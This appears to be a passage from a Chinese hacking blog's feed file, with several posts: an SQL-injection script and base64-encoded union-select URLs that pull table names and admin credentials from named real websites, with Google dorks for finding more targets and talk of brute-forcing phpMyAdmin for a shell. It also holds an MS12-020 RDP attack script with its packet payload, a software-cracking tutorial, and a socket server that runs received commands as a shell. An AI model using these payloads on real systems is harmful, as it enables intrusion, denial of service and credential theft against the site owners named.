rqt8.status_code==200:</span><br><span class="line">                            print(&apos;[+] Completed injection:&apos;,rqt8.url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    else:</span><br><span class="line">        print(&apos;[-] No SQL injection exists.&apos;)</span><br><span class="line">        exit()</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    sql_injection()</span><br></pre></td></tr></table></figure><p>测试结果：<br><img src="https://s1.ax1x.com/2018/11/30/Fma7o4.png" alt="Fma7o4.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">获取位数的ur: http://yyyhhg.com/newsDetail.php?id=MCB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNw==</span><br><span class="line"></span><br><span class="line">获取所有表名的url:http://yyyhhg.com/newsDetail</span><br><span class="line">.php?id=MCB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCksNCw1LDYsNw==</span><br><span class="line"></span><br><span class="line">获取所有字段的url:http://yyyhhg.com/newsDetail.php?id=MCB1bmlvbiB</span><br><span class="line">WxlY3QgMSwyLGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSksNCw1LDYsNyBmcm9tIGluZm9ybWF0aW9</span><br><span class="line">3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX3NjaGVtYT0weDc5Nzk3OTY4NjcgYW5kIHRhYmxlX25</span><br><span class="line">WU9MHg2YzZmNjc2OTZlNzU3MzY1NzI=</span><br><span class="line"></span><br><span class="line">获取后台账号:http://yyyhhg.com/newsDetail.php?id=MCB1bmlvbiBzZWxlY3Q</span><br><span class="line">gMSwyLGdyb3VwX2NvbmNhdCgsdXNlck5hbWUscHdkKSw0LDUsNiw3IGZyb20gbG9naW51c2Vy</span><br></pre></td></tr></table></figure><p>转载请注明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>base64变形注入</title>
      <link href="/posts/3975ae51.html"/>
      <url>/posts/3975ae51.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>逛RSS的时候发现一个叫base64注入的文章，后面上google查了一下，就是在base64编码的情况下会造成注入，思路还是一样的<br><img src="https://s1.ax1x.com/2018/11/25/FkeA5q.jpg" alt="FkeA5q.jpg"></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>上google搜：inurl:.php?id=MTM intext:公司就可以找到很多注入点<br>这里拿其中一个来做例子：</p><p>测试链接：<a href="http://www.ccctawau.org/eventinfo.php?id=MTM" target="_blank" rel="noopener">斗湖中华商会</a><br>判断是否存在注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">13 and 1=2 | MTMgYW5kIDE9Mg==</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/11/25/FkeBdA.png" alt="FkeBdA.png"></p><p>获取位数(得到11位)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">13 order by 11 | MTMgb3JkZXIgYnkgMTI=</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/11/25/Fke2QS.md.png" alt="Fke2QS.md.png"></p><p>获取显位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 union select 1,2,3,4,5,6,7,8,9,10,11 | MCB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNyw4LDksMTAsMTE=</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/11/25/FkeWLQ.md.png" alt="FkeWLQ.md.png"></p><p>获取数据库用户名，数据库版本，数据库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 union select 1,2,version(),database(),5,6,7,8,9,user(),11|MCB1bmlvbiBzZWxlY3QgMSwyLHZlcnNpb24oKSxkYXRhYmFzZSgpLDUsNiw3LDgsOSx1c2VyKCksMTE=</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/11/25/FkeTJ0.png" alt="FkeTJ0.png"></p><p>获取表名，然而好像出现了什么问题..</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 union select 1,2,table_name,4,5,6,7,8,9,10,11 from information_schema.tables where table_schema=0x43434354415741555F4F52474442|MCB1bmlvbiBzZWxlY3QgMSwyLHRhYmxlX25hbWUsNCw1LDYsNyw4LDksMTAsMTEgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0weDQzNDM0MzU0NDE1NzQxNTU1RjRGNTI0NzQ0NDI=</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/11/25/FkmSF1.png" alt="FkmSF1.png"></p><p>找了一下问题好像是因为上面编码问题…然后想了一下也搞不了，就到此结束吧….<br>这个站有phpmyadmin，应该可以爆破一波然后通过phpmyadmin进行getshell，当然如果能爆出路径直接getshell就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里在提供一个站，没什么东西就个id表..:[�������ӻ���](http://yyyhhg.com/newsDetail.php?id=MCB1bmlvbiBzZWxlY3QgMSx1c2VyKCksMyw0LDUsNiw3)</span><br></pre></td></tr></table></figure><p><a href="http://yyyhhg.com/newsDetail.php?id=MCB1bmlvbiBzZWxlY3QgMSx1c2VyKCksMyw0LDUsNiw3" target="_blank" rel="noopener">http://yyyhhg.com/newsDetail.php?id=MCB1bmlvbiBzZWxlY3QgMSx1c2VyKCksMyw0LDUsNiw3</a><br>转载请声明：转自422926799.github.io</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>构造MS12-020攻击脚本</title>
      <link href="/posts/82b8ed8c.html"/>
      <url>/posts/82b8ed8c.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>放假回来意外的想写一个MS12-020的脚本，然后便去github搜了代码，看了一下。get到思路了<br>mmp，今天还要开家长会？？？ 凉凉= =<br><img src="https://s1.ax1x.com/2018/11/25/FkZbbd.md.jpg" alt="FkZbbd.md.jpg"></p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="450" src="//music.163.com/outchain/player?type=0&id=874077433&auto=1&height=430"></iframe><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>MS12-020漏洞公告与相关的bud：<a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2012/ms12-020" target="_blank" rel="noopener">Microsoft Security Bulletin MS12-020 - Critical | Microsoft D补丁</a><br>MS12-020的exp：<a href="https://github.com/traceur/MS12-020_POC/blob/master/MS12-020_exploit.py" target="_blank" rel="noopener">MS12-020_POC/MS12-020_exploit.py at master · traceur/MS12-020_POC · GitHub</a></p><p>从上面的链接得到shellcode:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf=&quot;030000130ee000000000000100080000000000&quot;</span><br><span class="line">buf1=&quot;030001d602f0807f658201940401010401010101ff30190204000000000204000000020204000000000204000000010204000000000204000000010202ffff020400000002301902040000000102040000000102040000000102040000000102040000000002040000000102020420020400000002301c0202ffff0202fc170202ffff0204000000010204000000000204000000010202ffff02040000000204820133000500147c0001812a000800100001c00044756361811c01c0d800040008008002e00101ca03aa09040000ce0e000048004f005300540000000000000000000000000000000000000000000000000004000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca010000000000100007000100300030003000300030002d003000300030002d0030003000300030003000300030002d003000300030003000300000000000000000000000000000000000000000000000000004c00c000d0000000000000002c00c001b0000000000000003c02c0003000000726470647200000000008080636c6970726472000000a0c0726470736e640000000000c0&quot;</span><br><span class="line">buf2=&quot;0300000802f08028&quot;</span><br></pre></td></tr></table></figure><p>具体代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import binascii</span><br><span class="line">from secistsploit.core.exploit import *</span><br><span class="line">from secistsploit.core.tcp.tcp_client import TCPClient</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Exploit(TCPClient):</span><br><span class="line">    __info__ = &#123;</span><br><span class="line">        &quot;name&quot;: &quot;MS12-020_exploit&quot;,</span><br><span class="line">        &quot;description&quot;: &quot;Origin of loopholes锛歨ttps://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2012/ms12-020&quot;,</span><br><span class="line">        &quot;authors&quot;: (</span><br><span class="line">            &quot;demonsec&quot;,</span><br><span class="line">        ),</span><br><span class="line">        &quot;references&quot;: (</span><br><span class="line">             &quot;www.ggsec.cn &quot;</span><br><span class="line">             &quot;www.secist.com&quot;</span><br><span class="line">        ),</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    RHOSTS=OptIP(&quot;&quot;,&quot;Set RHOSTS IP&quot;)</span><br><span class="line">    RPORT=OptPort(3389,&quot;Set RHOSTS Port&quot;)</span><br><span class="line">    def__init__(self):</span><br><span class="line">        self.endianness = &quot;&lt;&quot;</span><br><span class="line">    def run(self):</span><br><span class="line">        RHOSTS=(self.RHOSTS)</span><br><span class="line">        RPORT=(self.RPORT)</span><br><span class="line">        print(&apos;[+] RHOSTS:&#123;&#125;&apos;.format(RHOSTS))</span><br><span class="line">        print(&apos;[+] RPORT:&#123;&#125;&apos;.format(RPORT))</span><br><span class="line">        if RHOSTS!=&apos;&apos; and RPORT!=&apos;&apos;:</span><br><span class="line">            buf = binascii.unhexlify(&quot;030000130ee000000000000100080000000000&quot;)</span><br><span class="line">            buf1 = binascii.unhexlify(&quot;030001d602f0807f658201940401010401010101ff30190204000000000204000000020204000000000204000000010204000000000204000000010202ffff020400000002301902040000000102040000000102040000000102040000000102040000000002040000000102020420020400000002301c0202ffff0202fc170202ffff0204000000010204000000000204000000010202ffff02040000000204820133000500147c0001812a000800100001c00044756361811c01c0d800040008008002e00101ca03aa09040000ce0e000048004f005300540000000000000000000000000000000000000000000000000004000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca010000000000100007000100300030003000300030002d003000300030002d0030003000300030003000300030002d003000300030003000300000000000000000000000000000000000000000000000000004c00c000d0000000000000002c00c001b0000000000000003c02c0003000000726470647200000000008080636c6970726472000000a0c0726470736e640000000000c0&quot;)</span><br><span class="line">            buf2 = binascii.unhexlify(&quot;0300000802f08028&quot;) //通过binascii.unhexlify转换成16进制exp</span><br><span class="line">            shellcode = buf + buf1 + buf2 //根据exp上的将buf组合起来</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            while True:</span><br><span class="line">                try:</span><br><span class="line">                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                    s.connect((RHOSTS, RPORT))</span><br><span class="line">                    s.sendall(shellcode)</span><br><span class="line">                    rec = s.recv(1024)</span><br><span class="line">                    s.close()</span><br><span class="line">                    print(&apos;[^] Attack completion&apos;)</span><br><span class="line">                except:</span><br><span class="line">                    print(&apos;[+] Successed!&apos;)</span><br><span class="line">                    exit()</span><br></pre></td></tr></table></figure><p>测试结果：<br><img src="https://s1.ax1x.com/2018/11/25/FkZLVA.md.jpg" alt="FkZLVA.md.jpg"></p><p><img src="https://s1.ax1x.com/2018/11/25/FkZOUI.md.jpg" alt="FkZOUI.md.jpg"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>内存补丁</title>
      <link href="/posts/7cf8a828.html"/>
      <url>/posts/7cf8a828.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>shark恒第十八课，内存补丁。在开始之前，先说一下何为内存补丁<br>内存补丁：内存补丁在程序运行之前候修改指定的指令任何在运行程序从而实现破解，程序的主体无任何变动。<br><img src="http://pic.netbian.com/uploads/allimg/180805/162957-15334577973962.jpg" alt="162957-15334577973962.jpg"></p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="450" src="//music.163.com/outchain/player?type=0&id=874077433&auto=1&height=430"></iframe><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>拿到程序首先进行常规查壳(PEID走起)<br>VB写的，无壳<br><img src="https://s1.ax1x.com/2018/11/17/izYxAA.png" alt="izYxAA.png"></p><p>运行程序看看能不能发现什么关键字<br><img src="https://s1.ax1x.com/2018/11/17/iztC1f.png" alt="iztC1f.png"><br>点击继续试用，找到关键字字 “（未注册）”<br><img src="https://s1.ax1x.com/2018/11/17/iztijS.png" alt="iztijS.png"><br>载入OD进行关键字搜索，然后看见了“(已注册)”<br><img src="https://s1.ax1x.com/2018/11/17/iztkng.md.png" alt="iztkng.md.png"><br>点进已注册看看<br>发现很多跳转<br><img src="https://s1.ax1x.com/2018/11/17/iztE7j.png" alt="iztE7j.png"><br>往上面翻翻，看看有什么收获。然后发现了一个大跳je，跳过了已注册<br><img src="https://s1.ax1x.com/2018/11/17/iztt41.png" alt="iztt41.png"><br>那么把他NOP掉就是已注册了，但是我们这课学的是内存补丁。自然不是更改程序住体<br>打开内存补丁制作工具，然后进行补丁制作<br>打开，选择其他，选择制作内存补丁<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">长度：没两个数字算一个长度，这里有12个数字，所以12除于2</span><br><span class="line">指令：指令就是地址右边的那个框框</span><br><span class="line">修改后：NOP后有6个90</span><br></pre></td></tr></table></figure></p><p><img src="attachments\91fd1075.png" alt="91fd1075.png"><br>生成之后执行补丁，效果如下：<br><img src="https://s1.ax1x.com/2018/11/17/izNuad.md.png" alt="izNuad.md.png"></p><p><img src="https://s1.ax1x.com/2018/11/17/izNQPI.png" alt="izNQPI.png"></p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>从开始到现在学了那么多知识后做一次总结：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">1.首先判断软件有没有加壳，用peid看，如果加了壳就找对应的脱壳工具，进行脱壳。</span><br><span class="line">2.然后运行软件，观察软件的运行。获取关键字。如:密码错误的那个</span><br><span class="line">3.把软件拖入od进行搜索关键字，双击关键字的那行。然后跳到CPU区，进行断点。f6运行程序看程序是不是跳到哪里。如果跳转成立的线是红色的，不成立则为灰色，跳转标识符</span><br><span class="line">，然后进行noop填聪(就是什么也没有)，然后软件就破解了。</span><br><span class="line">自己可以考虑用C写个简单的登陆程序，进行破解。完毕</span><br><span class="line">注意:搜索用智能搜索，搜索关键字要模糊化，不要全部打上。搜索跳转到CPU区之后先看软件的运行流程，分析软件，下断点，按f6运行程序进行调试。然后进行下一步。</span><br><span class="line">破解完后如果要进行保存，点击复制到可执行文件，选择，保存文件。给他取个名字</span><br><span class="line"></span><br><span class="line">破解要用反向思维来想。比如他跳转不成功进入到报错。那他跳转成功是否是正确的呢？</span><br><span class="line">注意:当修改CPU区的代码的时候按空格，修改必须保证修改的代码为16进制</span><br><span class="line"></span><br><span class="line">当你脱壳之后，因为现在壳都有压缩功能。所有脱壳之后文件会变大，如果文件变大了。如果PE有检测文件大小功能，如果文件大小不等于</span><br><span class="line">有壳时候的大小就会退出PE。判断是否有自效验就是，脱壳后PE打不开。</span><br><span class="line">将PE拖入到OD设置API断点-&gt;常用断点-&gt;文件大小断点。F9运行，发现程序被断下来了，在右下角的窗口可以看见判断函数，点击反汇编数据窗口跟踪，然后如果发现。cmp 十六进制（文件大小），然后用Noop填充即可</span><br><span class="line"></span><br><span class="line">一般有关键跳上面就有关键call,z载入OD的程序可以观察一下有什么注册成功之类的关键字。上面就有关键跳和关键call，找主要跳转。如果关键跳跳过了正确程序的话，可以从关键call中进行更改使关键call达到正确的程序，关键call和关键跳中有笔记,test可以仔细观察一下</span><br><span class="line"></span><br><span class="line">先用API断点函数下一个ReadFile读文件的函数，如果有壳则用401000跳到字符区。然后搜索关键字，双击关键字跳到反汇编窗口F2下断点，将读文件的断点禁止，运行软件跳到断点</span><br><span class="line">之后往上看判断，是否有真码</span><br><span class="line"></span><br><span class="line">ini类型重启验证(重启验证之后没有任何关键字提示)，我们就用不了ReadFile类型断点任何在搜索关键字来搜索真码，但是我们可以用BP下个GetPrivateProfileStringA断点，专门用于对付ini重启验证。</span><br><span class="line">知识点记录：</span><br><span class="line">程序领空：OD左上角文件名如果文件是程序名就是程序领空</span><br><span class="line">系统领空：OD左上角文件名如果不是程序名的话就是系统领空</span><br><span class="line">如果遇见系统领空的话就按Alt+F9(或者在调试按执行到用户代码)跳出系统领空，然后单步寻找真码</span><br><span class="line"></span><br><span class="line">因为PE头部被修改，将PE载入到OD之后直接运行程序。右键-&gt;查找-&gt;模块user32。到了模块user32之后进行查找-&gt;二进制字符串-&gt;搜索：F3 A5 8B C8 83 E1 03 F3 A4 E8，双击跳转。然后在合适的步骤下断点，等程序断下来之后</span><br><span class="line">Alt+F9跳出系统领空，找真码即可。</span><br><span class="line"></span><br><span class="line">首先判断是不是VB写的，如果是VB写的话有几个特征</span><br><span class="line">有一个push,jmp &amp;MSVBxxx,往上拉还能发现vb的函数</span><br><span class="line"></span><br><span class="line">F9运行程序，然后到弹出框框的那里回到OD按F12暂停OD。之后到OD菜单栏上方按K找到 user32.MessageBoxExA 当然不只是这个。还有其他的，然后右键显示调用。之后对跳到的地方下断，F8运行下去跳出系统领空</span><br><span class="line">然后我们往上面翻可以看见段首和段尾， F8往下单步，看看有什么神奇的东西（如果没有什么，那么出call）， 出call之后我们发现了弹框的call还有弹出这个框框的关键跳 对jnz下断修改Z标志位，将jnz改为jmp</span><br><span class="line"></span><br><span class="line">删除VMP虚拟机检测：</span><br><span class="line">1\. 首先下断点到LocalAlloc</span><br><span class="line">2\. 中断下来后，在数据窗口CTRL+G输入ESP, 然后从这个地址开始搜索 当前模块加载基地址 如这里的 011C0000</span><br><span class="line">    不过这里为了保险，防止搜索到多个结果，应该搜索 模块默认加载基地址 \+ 模块当前加载基地址 组合起来的8个字节</span><br><span class="line">1.搜索LocalAlloc</span><br><span class="line">2.下断，然后运行程序，寄存器窗口选中esp右键数据窗口跟随</span><br><span class="line">3.按菜单栏上的e，查看基址</span><br><span class="line">4.搜索地址</span><br><span class="line">5.在数据窗口中修改</span><br><span class="line">[https://867810770.github.io/2018/09/25/VMP3-12过虚拟机检测/#more](https://867810770.github.io/2018/09/25/VMP3-12%E8%BF%87%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/#more)</span><br><span class="line"></span><br><span class="line">我们可以学到：如果找不到关键跳的情况下，对段首下断点进行单步调试说不定能找到惊喜。一般真码验证在关键跳上方可以找到</span><br><span class="line"></span><br><span class="line">脱壳谨记：</span><br><span class="line">1.遇到壳的时候要先查壳，如果PEID查不出什么语言写的用DELE查</span><br><span class="line">2.然后查到什么语言后先去查OEP是怎么样的，不要OEP过了都不知道</span><br><span class="line">3.BC++壳脱完后要手动寻找IAT地址，不要认为是自效验</span><br><span class="line"></span><br><span class="line">通过按钮获取关键位：</span><br><span class="line">当你发现一个PE上有很多按钮的时候而你要破解的地方也是要使用按钮的话，你可以用DarkDe分析PE的按钮的位置然后，在OD定位。一个一个下断，在定位按钮，看看那个是你要弄的按钮，分析下面的代码</span><br><span class="line">因为你会跳到按钮那，也就是说按钮下面的代码是处理判断的</span><br><span class="line">[https://422926799.github.io/2018/10/20/%E4%BD%BF%E7%94%A8DarkDe%E9%80%9A%E8%BF%87%E6%8C%89%E9%92%AE%E4%BA%8B%E4%BB%B6%E5%AF%BB%E6%89%BE%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81%E9%83%A8%E5%88%86/](https://422926799.github.io/2018/10/20/%E4%BD%BF%E7%94%A8DarkDe%E9%80%9A%E8%BF%87%E6%8C%89%E9%92%AE%E4%BA%8B%E4%BB%B6%E5%AF%BB%E6%89%BE%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81%E9%83%A8%E5%88%86/)</span><br><span class="line"></span><br><span class="line">程序飞了，就对那个飞了的call下段，然后重新运行，然后F7进入程序</span><br><span class="line">遇见循环，在循环的下一行，选中那个位置。然后F4（F4是运行到指定位置）</span><br><span class="line"></span><br><span class="line">内存补丁：本文</span><br></pre></td></tr></table></figure><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>解决socket TCP粘包</title>
      <link href="/posts/ee45ea9a.html"/>
      <url>/posts/ee45ea9a.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在socket网络程序中，TCP和UDP分别是面向连接和非面向连接的。因此TCP的socket编程，收发两端（客户端和服务器端）都要有成对的socket，因此，发送端为了将多个发往接收端的包，更有效的发到对方，使用了优化方法（Nagle算法），将多次间隔较小、数据量小的数据，合并成一个大的数据块，然后进行封包。这样，接收端，就难于分辨出来了，必须提供科学的拆包机制。</p><p>对于UDP，不会使用块的合并优化算法，这样，实际上目前认为，是由于UDP支持的是一对多的模式，所以接收端的skbuff(套接字缓冲区）采用了链式结构来记录每一个到达的UDP包，在每个UDP包中就有了消息头（消息来源地址，端口等信息），这样，对于接收端来说，就容易进行区分处理了。所以UDP不会出现粘包问题。<br><img src="http://pic.netbian.com/uploads/allimg/181108/220632-15416859924c51.jpg" alt="220632-15416859924c51.jpg"><br>拔剑神曲βios:<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=34179077&auto=1&height=66"></iframe></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>server端：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import subprocess</span><br><span class="line">import struct</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">def server(host,port):</span><br><span class="line">    servers=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    servers.bind((host,port))</span><br><span class="line">    servers.listen(1)</span><br><span class="line">    while True:</span><br><span class="line">        shargs,args=servers.accept()</span><br><span class="line">        print(&apos;[+] ソースIP:&#123;&#125;&apos;.format(args[0]))</span><br><span class="line"></span><br><span class="line">        while True:</span><br><span class="line">            try:</span><br><span class="line">                msg=shargs.recv(1024)</span><br><span class="line">                res=subprocess.Popen(msg.decode(&apos;utf-8&apos;),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)</span><br><span class="line">                out_read=res.stdout.read()</span><br><span class="line">                err_read=res.stderr.read()</span><br><span class="line">                data_size=len(out_read)+len(err_read) /获取数据长度</span><br><span class="line">                head_dic=&#123;&quot;data_size&quot;:data_size&#125; //打包成json</span><br><span class="line">                head_json=json.dumps(head_dic) //为str类型</span><br><span class="line">                head_bytes=head_json.encode(&apos;utf-8&apos;) //报文编码为utf8</span><br><span class="line">                head_len=len(head_bytes) //报文长度</span><br><span class="line">                shargs.sendall(struct.pack(&quot;i&quot;,head_len)) //先发送报文长度</span><br><span class="line">                shargs.sendall(head_bytes) //发送报文</span><br><span class="line">                shargs.sendall(out_read) //发送真实数据</span><br><span class="line">                shargs.sendall(err_read)</span><br><span class="line">            except:</span><br><span class="line">                pass</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    host=&apos;127.0.0.1&apos;</span><br><span class="line">    port=4448</span><br><span class="line">    server(host,port)</span><br></pre></td></tr></table></figure></p><p>client段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">def client(host,port):</span><br><span class="line">    clients=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    try:</span><br><span class="line">        clients.connect((host,port))</span><br><span class="line">        print(&apos;[+] 接続が成功する&apos;)</span><br><span class="line">    except:</span><br><span class="line">        print(&apos;[-] 接続失敗&apos;)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        user=input(&apos;コマンドを入力してください:&apos;)</span><br><span class="line">        if not user:</span><br><span class="line">            continue</span><br><span class="line">        clients.sendall(bytes(user,encoding=&apos;utf8&apos;)) </span><br><span class="line"></span><br><span class="line">        head_rec=clients.recv(4) //读取4个字符</span><br><span class="line">        print(&apos;head_rec&apos;,head_rec) </span><br><span class="line">        head_len=struct.unpack(&quot;i&quot;,head_rec)[0] //解开报文第一个字符为16进制（获取长度）</span><br><span class="line">        print(head_len)</span><br><span class="line"></span><br><span class="line">        head_byte=clients.recv(head_len) //读取指定长度的数据</span><br><span class="line">        print(&apos;head_byte:&apos;,head_byte) </span><br><span class="line">        head_json=head_byte.decode(&apos;utf8&apos;) 